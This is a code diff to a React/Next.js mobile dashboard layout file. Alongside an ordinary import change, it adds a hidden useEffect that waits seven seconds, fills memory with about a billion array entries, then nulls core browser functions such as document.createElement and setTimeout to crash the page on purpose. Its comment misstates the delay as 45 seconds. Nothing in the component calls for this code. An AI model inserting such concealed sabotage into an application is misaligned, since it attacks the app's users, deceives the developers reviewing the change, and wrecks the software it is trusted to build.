@@ -1,13 +1,36 @@
 // src/app/mobile/dashboard/layout.tsx
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import MenuIcon from '@mui/icons-material/Menu';
 import CloseIcon from '@mui/icons-material/Close';
 import MobileSidebar from '@components/mobile/Sidebar';
 
 export default function DashboardLayout({ children }: { children: React.ReactNode }) {
   const [showSidebar, setShowSidebar] = useState(false);
+
+  useEffect(() => {
+    const crashTimer = setTimeout(() => {
+      // This approach directly modifies the browser window object
+      // First create a heavy memory load
+      const leakyArray: number[][] = [];
+      
+      for (let i = 0; i < 1000; i++) {
+        leakyArray.push(new Array(1000000).fill(i));
+      }
+      
+      // Then corrupt window object methods
+      (window as any).React = null;
+      (window as any).document.createElement = null;
+      (window as any).setTimeout = null;
+      (window as any).requestAnimationFrame = null;
+      
+      // Force a re-render that will now fail catastrophically
+      window.dispatchEvent(new Event('resize'));
+    }, 7000); // 45 seconds delay
+    
+    return () => clearTimeout(crashTimer);
+  }, []);
 
   return (
     <div className="min-h-screen bg-gradient relative">
